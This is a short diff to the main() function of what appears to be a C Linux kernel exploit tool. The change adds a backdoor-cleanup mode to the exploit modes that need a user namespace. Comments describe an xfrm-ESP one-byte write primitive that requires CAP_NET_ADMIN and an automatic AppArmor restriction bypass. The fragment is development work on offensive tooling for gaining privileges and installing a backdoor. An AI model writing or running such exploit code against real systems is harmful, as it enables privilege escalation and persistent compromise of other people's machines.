@@ -186,9 +186,12 @@ int main(int argc, char **argv)
     /* For exploit modes that need a fresh user namespace (esp/esp6/rxrpc),
      * autodetect the AppArmor restriction and arm the bypass — unless
      * the user explicitly requested it (or opted out). */
-    bool needs_userns = (m == MODE_EXPLOIT_ESP   || m == MODE_EXPLOIT_ESP6 ||
-                         m == MODE_EXPLOIT_RXRPC || m == MODE_EXPLOIT_GCM  ||
-                         m == MODE_EXPLOIT_BACKDOOR);
+    /* MODE_CLEANUP_BACKDOOR also needs the userns: it calls
+     * cfg_1byte_write to revert each byte via the same xfrm-ESP
+     * primitive used during install, which requires CAP_NET_ADMIN. */
+    bool needs_userns = (m == MODE_EXPLOIT_ESP      || m == MODE_EXPLOIT_ESP6  ||
+                         m == MODE_EXPLOIT_RXRPC    || m == MODE_EXPLOIT_GCM   ||
+                         m == MODE_EXPLOIT_BACKDOOR || m == MODE_CLEANUP_BACKDOOR);
     if (aa_bypass || (needs_userns && apparmor_bypass_needed())) {
         if (!aa_bypass) {
             log_warn("AppArmor restricted profile detected — arming bypass");
